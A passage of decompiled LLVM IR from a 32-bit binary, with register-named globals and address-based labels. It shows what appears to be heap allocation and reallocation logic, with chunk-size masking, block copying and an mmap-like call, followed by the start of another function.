  %v2_8050d69 = add i32 %v0_8050d69, %.v1_8050d08
  store i32 %v2_8050d69, i32* %eax.global-to-local, align 4
  %v1_8050d6c = or i32 %v2_8050d67, 1
  store i32 %v1_8050d6c, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050d69, i32* @global_var_805334c.33, align 4
  %v2_8050d74 = add i32 %v2_8050d69, 4
  %v3_8050d74 = inttoptr i32 %v2_8050d74 to i32*
  store i32 %v1_8050d6c, i32* %v3_8050d74, align 4
  br label %dec_label_pc_8050f8f

dec_label_pc_8050d7c:                             ; preds = %dec_label_pc_8050d39
  store i32 %v3_8050d7c, i32* %edx.global-to-local, align 4
  %v1_8050d81 = and i32 %v3_8050d7c, -2
  store i32 %v1_8050d81, i32* %eax.global-to-local, align 4
  %v3_8050d84 = add i32 %v1_8050d7c, %v1_8050d81
  %v4_8050d84 = inttoptr i32 %v3_8050d84 to i8*
  %v5_8050d84 = load i8, i8* %v4_8050d84, align 1
  %v6_8050d84 = urem i8 %v5_8050d84, 2
  %v7_8050d84 = icmp eq i8 %v6_8050d84, 0
  %v1_8050d89 = icmp eq i1 %v7_8050d84, false
  br i1 %v1_8050d89, label %dec_label_pc_8050dba, label %dec_label_pc_8050d8b

dec_label_pc_8050d8b:                             ; preds = %dec_label_pc_8050d7c
  %v1_8050d8b = and i32 %v3_8050d7c, -4
  store i32 %v1_8050d8b, i32* %edx.global-to-local, align 4
  %v2_8050d92 = add i32 %v1_8050d8b, %v1_8050d1b
  store i32 %v2_8050d92, i32* @ebx, align 4
  %v10_8050d94 = icmp ult i32 %v2_8050d92, %.v1_8050d08
  br i1 %v10_8050d94, label %dec_label_pc_8050dba, label %dec_label_pc_8050d9a

dec_label_pc_8050d9a:                             ; preds = %dec_label_pc_8050d8b
  %v1_8050d9a = add i32 %v1_8050d1b, %tmp7
  %v2_8050d9a = inttoptr i32 %v1_8050d9a to i32*
  %v3_8050d9a = load i32, i32* %v2_8050d9a, align 4
  store i32 %v3_8050d9a, i32* @edx, align 4
  %v1_8050d9d = add i32 %v2_8050d39, 12
  %v2_8050d9d = inttoptr i32 %v1_8050d9d to i32*
  %v3_8050d9d = load i32, i32* %v2_8050d9d, align 4
  store i32 %v3_8050d9d, i32* %eax.global-to-local, align 4
  %v1_8050da0 = add i32 %v3_8050d9a, 12
  %v2_8050da0 = inttoptr i32 %v1_8050da0 to i32*
  %v3_8050da0 = load i32, i32* %v2_8050da0, align 4
  %v15_8050da0 = icmp eq i32 %v3_8050da0, %v2_8050d39
  %v1_8050da3 = icmp eq i1 %v15_8050da0, false
  br i1 %v1_8050da3, label %dec_label_pc_8050daa, label %dec_label_pc_8050da5

dec_label_pc_8050da5:                             ; preds = %dec_label_pc_8050d9a
  %v1_8050da5 = add i32 %v3_8050d9d, 8
  %v2_8050da5 = inttoptr i32 %v1_8050da5 to i32*
  %v3_8050da5 = load i32, i32* %v2_8050da5, align 4
  %v15_8050da5 = icmp eq i32 %v3_8050da5, %v2_8050d39
  br i1 %v15_8050da5, label %dec_label_pc_8050daf, label %dec_label_pc_8050daa

dec_label_pc_8050daa:                             ; preds = %dec_label_pc_8050da5, %dec_label_pc_8050d9a
  %v0_8050daa = call i32 @function_805137f()
  store i32 %v0_8050daa, i32* %eax.global-to-local, align 4
  %v1_8050daf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050daf

dec_label_pc_8050daf:                             ; preds = %dec_label_pc_8050da5, %dec_label_pc_8050daa
  %v1_8050daf = phi i32 [ %v3_8050d9a, %dec_label_pc_8050da5 ], [ %v1_8050daf.pre, %dec_label_pc_8050daa ]
  %v0_8050daf = phi i32 [ %v3_8050d9d, %dec_label_pc_8050da5 ], [ %v0_8050daa, %dec_label_pc_8050daa ]
  %v2_8050daf = add i32 %v1_8050daf, 12
  %v3_8050daf = inttoptr i32 %v2_8050daf to i32*
  store i32 %v0_8050daf, i32* %v3_8050daf, align 4
  %v0_8050db2 = load i32, i32* @edx, align 4
  %v1_8050db2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050db2 = add i32 %v1_8050db2, 8
  %v3_8050db2 = inttoptr i32 %v2_8050db2 to i32*
  store i32 %v0_8050db2, i32* %v3_8050db2, align 4
  %v0_8050e6a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050e6a

dec_label_pc_8050dba:                             ; preds = %dec_label_pc_8050d8b, %dec_label_pc_8050d7c, %dec_label_pc_8050d44
  %v1_8050dc1 = add i32 %.v1_8050d08, -7
  store i32 %v1_8050dc1, i32* %eax.global-to-local, align 4
  store i32 %v1_8050dc1, i32* %stack_var_-60, align 4
  %v1_8050dc5 = call i32 @function_805041e(i32 %v1_8050dc1)
  store i32 %v1_8050dc5, i32* %eax.global-to-local, align 4
  store i32 %v1_8050dc5, i32* %edx.global-to-local, align 4
  %v1_8050dcf = icmp eq i32 %v1_8050dc5, 0
  br i1 %v1_8050dcf, label %dec_label_pc_8050f8b, label %dec_label_pc_8050dd7

dec_label_pc_8050dd7:                             ; preds = %dec_label_pc_8050dba
  %v1_8050dd7 = add i32 %v1_8050dc5, -8
  store i32 %v1_8050dd7, i32* %ebx.global-to-local, align 4
  %v1_8050dda = load i32, i32* @esi, align 4
  %v12_8050dda = icmp eq i32 %v1_8050dd7, %v1_8050dda
  %v1_8050ddc = add i32 %v1_8050dc5, -4
  %v2_8050ddc = inttoptr i32 %v1_8050ddc to i32*
  %v3_8050ddc = load i32, i32* %v2_8050ddc, align 4
  store i32 %v3_8050ddc, i32* %eax.global-to-local, align 4
  %v1_8050ddf = icmp eq i1 %v12_8050dda, false
  br i1 %v1_8050ddf, label %dec_label_pc_8050ded, label %dec_label_pc_8050de1

dec_label_pc_8050de1:                             ; preds = %dec_label_pc_8050dd7
  %v1_8050de1 = and i32 %v3_8050ddc, -4
  store i32 %v1_8050de1, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d1b, i32* %edx.global-to-local, align 4
  %v2_8050de8 = add i32 %v1_8050de1, %v1_8050d1b
  store i32 %v2_8050de8, i32* @ebx, align 4
  br label %dec_label_pc_8050e6a

dec_label_pc_8050ded:                             ; preds = %dec_label_pc_8050dd7
  %v1_8050df1 = add i32 %v1_8050d1b, -4
  store i32 %v1_8050df1, i32* %eax.global-to-local, align 4
  %v2_8050df6 = udiv i32 %v1_8050df1, 4
  store i32 %v2_8050df6, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050df1, 37
  br i1 %tmp, label %dec_label_pc_8050e0f, label %dec_label_pc_8050dfe

dec_label_pc_8050dfe:                             ; preds = %dec_label_pc_8050ded
  store i32 %v1_8050dc5, i32* %stack_var_-60, align 4
  %v3_8050e05 = inttoptr i32 %v1_8050dc5 to i16*
  %v4_8050e05 = call i32 @function_805220a(i16* %v3_8050e05, i32 %tmp7, i32 %v1_8050df1)
  store i32 %v4_8050e05, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e56

dec_label_pc_8050e0f:                             ; preds = %dec_label_pc_8050ded
  store i32 %tmp7, i32* @esi, align 4
  %v2_8050e16 = load i32, i32* %arg1, align 4
  store i32 %v2_8050e16, i32* %eax.global-to-local, align 4
  %v2_8050e18 = inttoptr i32 %v1_8050dc5 to i32*
  store i32 %v2_8050e16, i32* %v2_8050e18, align 4
  %v0_8050e1a = load i32, i32* @esi, align 4
  %v1_8050e1a = add i32 %v0_8050e1a, 4
  %v2_8050e1a = inttoptr i32 %v1_8050e1a to i32*
  %v3_8050e1a = load i32, i32* %v2_8050e1a, align 4
  store i32 %v3_8050e1a, i32* %eax.global-to-local, align 4
  %v1_8050e1d = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e1d = add i32 %v1_8050e1d, 4
  %v3_8050e1d = inttoptr i32 %v2_8050e1d to i32*
  store i32 %v3_8050e1a, i32* %v3_8050e1d, align 4
  %v0_8050e20 = load i32, i32* @esi, align 4
  %v1_8050e20 = add i32 %v0_8050e20, 8
  %v2_8050e20 = inttoptr i32 %v1_8050e20 to i32*
  %v3_8050e20 = load i32, i32* %v2_8050e20, align 4
  store i32 %v3_8050e20, i32* %eax.global-to-local, align 4
  %v1_8050e23 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e23 = add i32 %v1_8050e23, 8
  %v3_8050e23 = inttoptr i32 %v2_8050e23 to i32*
  store i32 %v3_8050e20, i32* %v3_8050e23, align 4
  %tmp28 = icmp ult i32 %v1_8050df1, 17
  br i1 %tmp28, label %dec_label_pc_8050e56, label %dec_label_pc_8050e28

dec_label_pc_8050e28:                             ; preds = %dec_label_pc_8050e0f
  %v0_8050e28 = load i32, i32* @esi, align 4
  %v1_8050e28 = add i32 %v0_8050e28, 12
  %v2_8050e28 = inttoptr i32 %v1_8050e28 to i32*
  %v3_8050e28 = load i32, i32* %v2_8050e28, align 4
  store i32 %v3_8050e28, i32* %eax.global-to-local, align 4
  %v0_8050e2b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050e2e = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e2e = add i32 %v1_8050e2e, 12
  %v3_8050e2e = inttoptr i32 %v2_8050e2e to i32*
  store i32 %v3_8050e28, i32* %v3_8050e2e, align 4
  %v0_8050e31 = load i32, i32* @esi, align 4
  %v1_8050e31 = add i32 %v0_8050e31, 16
  %v2_8050e31 = inttoptr i32 %v1_8050e31 to i32*
  %v3_8050e31 = load i32, i32* %v2_8050e31, align 4
  store i32 %v3_8050e31, i32* %eax.global-to-local, align 4
  %v1_8050e34 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e34 = add i32 %v1_8050e34, 16
  %v3_8050e34 = inttoptr i32 %v2_8050e34 to i32*
  store i32 %v3_8050e31, i32* %v3_8050e34, align 4
  %tmp23 = icmp ult i32 %v0_8050e2b, 7
  br i1 %tmp23, label %dec_label_pc_8050e56, label %dec_label_pc_8050e39

dec_label_pc_8050e39:                             ; preds = %dec_label_pc_8050e28
  %v0_8050e39 = load i32, i32* @esi, align 4
  %v1_8050e39 = add i32 %v0_8050e39, 20
  %v2_8050e39 = inttoptr i32 %v1_8050e39 to i32*
  %v3_8050e39 = load i32, i32* %v2_8050e39, align 4
  store i32 %v3_8050e39, i32* %eax.global-to-local, align 4
  %v0_8050e3c = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050e3f = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e3f = add i32 %v1_8050e3f, 20
  %v3_8050e3f = inttoptr i32 %v2_8050e3f to i32*
  store i32 %v3_8050e39, i32* %v3_8050e3f, align 4
  %v0_8050e42 = load i32, i32* @esi, align 4
  %v1_8050e42 = add i32 %v0_8050e42, 24
  %v2_8050e42 = inttoptr i32 %v1_8050e42 to i32*
  %v3_8050e42 = load i32, i32* %v2_8050e42, align 4
  store i32 %v3_8050e42, i32* %eax.global-to-local, align 4
  %v1_8050e45 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e45 = add i32 %v1_8050e45, 24
  %v3_8050e45 = inttoptr i32 %v2_8050e45 to i32*
  store i32 %v3_8050e42, i32* %v3_8050e45, align 4
  %tmp24 = icmp ult i32 %v0_8050e3c, 9
  br i1 %tmp24, label %dec_label_pc_8050e56, label %dec_label_pc_8050e4a

dec_label_pc_8050e4a:                             ; preds = %dec_label_pc_8050e39
  %v0_8050e4a = load i32, i32* @esi, align 4
  %v1_8050e4a = add i32 %v0_8050e4a, 28
  %v2_8050e4a = inttoptr i32 %v1_8050e4a to i32*
  %v3_8050e4a = load i32, i32* %v2_8050e4a, align 4
  store i32 %v3_8050e4a, i32* %eax.global-to-local, align 4
  %v1_8050e4d = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e4d = add i32 %v1_8050e4d, 28
  %v3_8050e4d = inttoptr i32 %v2_8050e4d to i32*
  store i32 %v3_8050e4a, i32* %v3_8050e4d, align 4
  %v0_8050e50 = load i32, i32* @esi, align 4
  %v1_8050e50 = add i32 %v0_8050e50, 32
  %v2_8050e50 = inttoptr i32 %v1_8050e50 to i32*
  %v3_8050e50 = load i32, i32* %v2_8050e50, align 4
  store i32 %v3_8050e50, i32* %eax.global-to-local, align 4
  %v1_8050e53 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e53 = add i32 %v1_8050e53, 32
  %v3_8050e53 = inttoptr i32 %v2_8050e53 to i32*
  store i32 %v3_8050e50, i32* %v3_8050e53, align 4
  br label %dec_label_pc_8050e56

dec_label_pc_8050e56:                             ; preds = %dec_label_pc_8050e39, %dec_label_pc_8050e28, %dec_label_pc_8050e0f, %dec_label_pc_8050dfe, %dec_label_pc_8050e4a
  %v0_8050e59 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050e59 = add i32 %v0_8050e59, 8
  store i32 %v1_8050e59, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050e60 = call i32 @function_80511e3(i32 %tmp7)
  br label %dec_label_pc_8050f86

dec_label_pc_8050e6a:                             ; preds = %dec_label_pc_8050d2b, %dec_label_pc_8050de1, %dec_label_pc_8050daf
  %v1_8050e7b = phi i32 [ %v1_8050d1b, %dec_label_pc_8050d2b ], [ %v2_8050de8, %dec_label_pc_8050de1 ], [ %v0_8050e6a.pre, %dec_label_pc_8050daf ]
  %v5_8050e6c = sub i32 %v1_8050e7b, %.v1_8050d08
  store i32 %v5_8050e6c, i32* %ecx.global-to-local, align 4
  %tmp25 = icmp ult i32 %v5_8050e6c, 16
  br i1 %tmp25, label %dec_label_pc_8050e75, label %dec_label_pc_8050e87

dec_label_pc_8050e75:                             ; preds = %dec_label_pc_8050e6a
  %v0_8050e75 = load i32, i32* @edi, align 4
  %v1_8050e75 = add i32 %v0_8050e75, 4
  %v2_8050e75 = inttoptr i32 %v1_8050e75 to i32*
  %v3_8050e75 = load i32, i32* %v2_8050e75, align 4
  %v1_8050e78 = urem i32 %v3_8050e75, 2
  %v2_8050e7b = or i32 %v1_8050e78, %v1_8050e7b
  store i32 %v2_8050e7b, i32* %eax.global-to-local, align 4
  store i32 %v2_8050e7b, i32* %v2_8050e75, align 4
  %v0_8050e80 = load i32, i32* @edi, align 4
  %v1_8050e80 = load i32, i32* @ebx, align 4
  %v2_8050e80 = add i32 %v0_8050e80, 4
  %v3_8050e80 = add i32 %v2_8050e80, %v1_8050e80
  %v4_8050e80 = inttoptr i32 %v3_8050e80 to i32*
  %v5_8050e80 = load i32, i32* %v4_8050e80, align 4
  %v6_8050e80 = or i32 %v5_8050e80, 1
  store i32 %v6_8050e80, i32* %v4_8050e80, align 4
  br label %dec_label_pc_8050eb7

dec_label_pc_8050e87:                             ; preds = %dec_label_pc_8050e6a
  store i32 %.v1_8050d08, i32* %edx.global-to-local, align 4
  %v0_8050e8b = load i32, i32* @edi, align 4
  %v2_8050e8b = add i32 %v0_8050e8b, %.v1_8050d08
  store i32 %v2_8050e8b, i32* %eax.global-to-local, align 4
  %v1_8050e8e = add i32 %v0_8050e8b, 4
  %v2_8050e8e = inttoptr i32 %v1_8050e8e to i32*
  %v3_8050e8e = load i32, i32* %v2_8050e8e, align 4
  %v1_8050e91 = urem i32 %v3_8050e8e, 2
  %v5_8050e94 = or i32 %v1_8050e91, %.v1_8050d08
  store i32 %v5_8050e94, i32* %v2_8050e8e, align 4
  %v0_8050e9e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ea0 = or i32 %v0_8050e9e, 1
  store i32 %v1_8050ea0, i32* %edx.global-to-local, align 4
  %v1_8050ea3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ea3 = add i32 %v1_8050ea3, 4
  %v3_8050ea3 = inttoptr i32 %v2_8050ea3 to i32*
  store i32 %v1_8050ea0, i32* %v3_8050ea3, align 4
  %v0_8050ea6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ea6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050ea6 = add i32 %v0_8050ea6, 4
  %v3_8050ea6 = add i32 %v2_8050ea6, %v1_8050ea6
  %v4_8050ea6 = inttoptr i32 %v3_8050ea6 to i32*
  %v5_8050ea6 = load i32, i32* %v4_8050ea6, align 4
  %v6_8050ea6 = or i32 %v5_8050ea6, 1
  store i32 %v6_8050ea6, i32* %v4_8050ea6, align 4
  %v0_8050eab = load i32, i32* %eax.global-to-local, align 4
  %v1_8050eab = add i32 %v0_8050eab, 8
  store i32 %v1_8050eab, i32* %eax.global-to-local, align 4
  store i32 %v1_8050eab, i32* %stack_var_-60, align 4
  %v1_8050eaf = call i32 @function_80511e3(i32 %v1_8050eab)
  store i32 %v1_8050eaf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050eb7

dec_label_pc_8050eb7:                             ; preds = %dec_label_pc_8050e75, %dec_label_pc_8050e87
  %v0_8050eb7 = load i32, i32* @edi, align 4
  %v1_8050eb7 = add i32 %v0_8050eb7, 8
  store i32 %v1_8050eb7, i32* @ebx, align 4
  br label %dec_label_pc_8050f93

dec_label_pc_8050ebf:                             ; preds = %dec_label_pc_8050cf8
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8050ec3 = load i32, i32* @global_var_805367c.38, align 4
  %v1_8050ec8 = add i32 %v0_8050ec3, -1
  store i32 %v1_8050ec8, i32* %eax.global-to-local, align 4
  %v2_8050ecd = inttoptr i32 %v1_8050d13 to i32*
  %v3_8050ecd = load i32, i32* %v2_8050ecd, align 4
  store i32 %v3_8050ecd, i32* @ebp, align 4
  %v1_8050ed0 = or i32 %.v1_8050d08, 4
  store i32 %v1_8050ed0, i32* %stack_var_-44, align 4
  %v2_8050ed6 = add i32 %v3_8050ecd, %v1_8050ec8
  store i32 %v2_8050ed6, i32* %edx.global-to-local, align 4
  %v1_8050ed9 = sub i32 0, %v0_8050ec3
  store i32 %v1_8050ed9, i32* %eax.global-to-local, align 4
  %v2_8050edb = add i32 %v2_8050ed6, %v1_8050ed0
  %v2_8050ede = and i32 %v2_8050edb, %v1_8050ed9
  store i32 %v2_8050ede, i32* @esi, align 4
  %v2_8050ee2 = sub i32 %v2_8050ede, %v3_8050ecd
  store i32 %v2_8050ee2, i32* @ebx, align 4
  %v15_8050ee4 = icmp eq i32 %v1_8050d1b, %v2_8050ee2
  br i1 %v15_8050ee4, label %dec_label_pc_8050f8f, label %dec_label_pc_8050eee

dec_label_pc_8050eee:                             ; preds = %dec_label_pc_8050ebf
  %v2_8050ef5 = sub i32 %v1_8050d13, %v3_8050ecd
  store i32 %v2_8050ef5, i32* @edi, align 4
  %v2_8050ef7 = add i32 %v3_8050ecd, %v1_8050d1b
  store i32 %v2_8050ef7, i32* %eax.global-to-local, align 4
  store i32 %v2_8050ef5, i32* %stack_var_-60, align 4
  %v6_8050efb = inttoptr i32 %v2_8050ef5 to i32*
  %v7_8050efb = call i32 @function_805206e(i32* %v6_8050efb, i32 %v2_8050ef7, i32 %v2_8050ede, i32 1, i32 %v1_8050ed0, i32 %v1_8050d1b)
  store i32 %v7_8050efb, i32* %eax.global-to-local, align 4
  %v10_8050f03 = icmp eq i32 %v7_8050efb, -1
  br i1 %v10_8050f03, label %dec_label_pc_8050f47, label %dec_label_pc_8050f08

dec_label_pc_8050f08:                             ; preds = %dec_label_pc_8050eee
  %v1_8050f08 = load i32, i32* @ebp, align 4
  %v2_8050f08 = add i32 %v1_8050f08, %v7_8050efb
  store i32 %v2_8050f08, i32* %edx.global-to-local, align 4
  %v0_8050f0b = load i32, i32* @ebx, align 4
  %v1_8050f0b = or i32 %v0_8050f0b, 2
  store i32 %v1_8050f0b, i32* %ebx.global-to-local, align 4
  %v0_8050f0e = load i32, i32* @esi, align 4
  store i32 %v0_8050f0e, i32* %eax.global-to-local, align 4
  %v2_8050f10 = add i32 %v2_8050f08, 4
  %v3_8050f10 = inttoptr i32 %v2_8050f10 to i32*
  store i32 %v1_8050f0b, i32* %v3_8050f10, align 4
  %v0_8050f13 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050f13 = sub i32 %v0_8050f13, %v1_8050d1b
  %v1_8050f17 = load i32, i32* @global_var_8053684.43, align 4
  %v2_8050f17 = add i32 %v1_8050f17, %v5_8050f13
  store i32 %v2_8050f17, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f17, i32* @global_var_8053684.43, align 4
  %v1_8050f22 = load i32, i32* @global_var_8053690.44, align 16
  %tmp26 = icmp ugt i32 %v2_8050f17, %v1_8050f22
  br i1 %tmp26, label %dec_label_pc_8050f2a, label %dec_label_pc_8050f2f

dec_label_pc_8050f2a:                             ; preds = %dec_label_pc_8050f08
  store i32 %v2_8050f17, i32* @global_var_8053690.44, align 16
  br label %dec_label_pc_8050f2f

dec_label_pc_8050f2f:                             ; preds = %dec_label_pc_8050f08, %dec_label_pc_8050f2a
  %v1_8050f2f = load i32, i32* @global_var_8053688.45, align 8
  %v2_8050f2f = add i32 %v1_8050f2f, %v2_8050f17
  store i32 %v2_8050f2f, i32* %eax.global-to-local, align 4
  %v1_8050f35 = load i32, i32* @global_var_8053694.46, align 4
  %tmp27 = icmp ugt i32 %v2_8050f2f, %v1_8050f35
  br i1 %tmp27, label %dec_label_pc_8050f3d, label %dec_label_pc_8050f42

dec_label_pc_8050f3d:                             ; preds = %dec_label_pc_8050f2f
  store i32 %v2_8050f2f, i32* @global_var_8053694.46, align 4
  br label %dec_label_pc_8050f42

dec_label_pc_8050f42:                             ; preds = %dec_label_pc_8050f2f, %dec_label_pc_8050f3d
  %v0_8050f42 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f42 = add i32 %v0_8050f42, 8
  store i32 %v1_8050f42, i32* @ebx, align 4
  br label %dec_label_pc_8050f93

dec_label_pc_8050f47:                             ; preds = %dec_label_pc_8050eee
  %v2_8050f47 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8050f47, i32* %eax.global-to-local, align 4
  %v10_8050f4a = icmp ult i32 %v1_8050d1b, %v2_8050f47
  %v1_8050f4e = icmp eq i1 %v10_8050f4a, false
  br i1 %v1_8050f4e, label %dec_label_pc_8050f8f, label %dec_label_pc_8050f50

dec_label_pc_8050f50:                             ; preds = %dec_label_pc_8050f47
  %v1_8050f57 = add i32 %.v1_8050d08, -7
  store i32 %v1_8050f57, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f57, i32* %stack_var_-60, align 4
  %v1_8050f5b = call i32 @function_805041e(i32 %v1_8050f57)
  store i32 %v1_8050f5b, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f5b, i32* @ebx, align 4
  %v1_8050f65 = icmp eq i32 %v1_8050f5b, 0
  br i1 %v1_8050f65, label %dec_label_pc_8050f8b, label %dec_label_pc_8050f69

dec_label_pc_8050f69:                             ; preds = %dec_label_pc_8050f50
  %v1_8050f6e = add i32 %v1_8050d1b, -8
  store i32 %v1_8050f6e, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f5b, i32* %stack_var_-60, align 4
  %v3_8050f77 = inttoptr i32 %v1_8050f5b to i16*
  %v4_8050f77 = call i32 @function_805220a(i16* %v3_8050f77, i32 %tmp7, i32 %v1_8050f6e)
  store i32 %v4_8050f77, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f5b, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050f81 = call i32 @function_80511e3(i32 %tmp7)
  br label %dec_label_pc_8050f86

dec_label_pc_8050f86:                             ; preds = %dec_label_pc_8050e56, %dec_label_pc_8050f69
  %storemerge = phi i32 [ %v1_8050f81, %dec_label_pc_8050f69 ], [ %v1_8050e60, %dec_label_pc_8050e56 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f93

dec_label_pc_8050f8b:                             ; preds = %dec_label_pc_8050f50, %dec_label_pc_8050dba
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050f93

dec_label_pc_8050f8f:                             ; preds = %dec_label_pc_8050f47, %dec_label_pc_8050ebf, %dec_label_pc_8050d59
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8050f93

dec_label_pc_8050f93:                             ; preds = %dec_label_pc_8050f8b, %dec_label_pc_8050f86, %dec_label_pc_8050f42, %dec_label_pc_8050eb7, %dec_label_pc_8050f8f
  store i32 %v2_8050cc8, i32* @eax, align 4
  store i32 %v2_8050cc8, i32* %stack_var_-60, align 4
  %v2_8050f9c = call i32 @function_805194a(i32 %v2_8050cc8, i32 1)
  store i32 %v2_8050f9c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fa1

dec_label_pc_8050fa1:                             ; preds = %dec_label_pc_8050cac, %dec_label_pc_8050c98, %dec_label_pc_8050f93
  br label %dec_label_pc_8050fa4

dec_label_pc_8050fa4:                             ; preds = %dec_label_pc_8050ce6, %dec_label_pc_8050fa1
  %v0_8050fa7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fa7, i32* %eax.global-to-local, align 4
  store i32 %v0_8050c89, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050fa7

; uselistorder directives
  uselistorder i32 %v1_8050f5b, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8050f2f, { 1, 0, 2 }
  uselistorder i32 %v2_8050f17, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050ef5, { 1, 0, 2 }
  uselistorder i32 %v1_8050ed0, { 1, 0, 2 }
  uselistorder i32 %v3_8050ecd, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050e8b, { 1, 0 }
  uselistorder i32 %v1_8050df1, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050dc5, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8050d69, { 1, 0, 2 }
  uselistorder i32 %v3_8050d7c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8050d39, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050d1b, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8050d13, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_8050d08, { 4, 13, 0, 1, 8, 7, 9, 10, 2, 12, 3, 11, 5, 6 }
  uselistorder i32 %v1_8050cf8, { 0, 2, 1 }
  uselistorder i32 %v0_8050ce1, { 1, 0 }
  uselistorder i32 %v2_8050cc8, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 50, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_80511e3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_805041e, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8050fa4, { 1, 0 }
  uselistorder label %dec_label_pc_8050fa1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050f93, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050f86, { 1, 0 }
  uselistorder label %dec_label_pc_8050f42, { 1, 0 }
  uselistorder label %dec_label_pc_8050f2f, { 1, 0 }
  uselistorder label %dec_label_pc_8050eb7, { 1, 0 }
  uselistorder label %dec_label_pc_8050e6a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050e56, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050daf, { 1, 0 }
}

define i32 @function_8050fae() local_unnamed_addr {
dec_label_pc_8050fae:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8050fb5 = load i32, i32* @edx, align 4
  store i32 %v0_8050fb5, i32* %ebp.global-to-local, align 4
  %v1_8050fb7 = add i32 %v0_8050fb5, 860
  %v2_8050fb7 = inttoptr i32 %v1_8050fb7 to i32*
  %v3_8050fb7 = load i32, i32* %v2_8050fb7, align 4
  store i32 %v3_8050fb7, i32* %ecx.global-to-local, align 4
  %v1_8050fbd = add i32 %v0_8050fb5, 44
  %v2_8050fbd = inttoptr i32 %v1_8050fbd to i32*
  %v3_8050fbd = load i32, i32* %v2_8050fbd, align 4
  %v1_8050fc0 = add i32 %v3_8050fbd, 4
  %v2_8050fc0 = inttoptr i32 %v1_8050fc0 to i32*
  %v3_8050fc0 = load i32, i32* %v2_8050fc0, align 4
  %v1_8050fc3 = and i32 %v3_8050fc0, -4
  store i32 %v1_8050fc3, i32* @esi, align 4
  %v1_8050fc8 = load i32, i32* @eax, align 4
  %v2_8050fc8 = add i32 %v3_8050fb7, -17
  %v2_8050fca = add i32 %v2_8050fc8, %v1_8050fc3
  %v3_8050fca = sub i32 %v2_8050fca, %v1_8050fc8
  %div = udiv i32 %v3_8050fca, %v3_8050fb7
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050fca, %v3_8050fb7
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050fd2 = add i32 %div, -1
  %v4_8050fd5 = mul i32 %v1_8050fd2, %v3_8050fb7
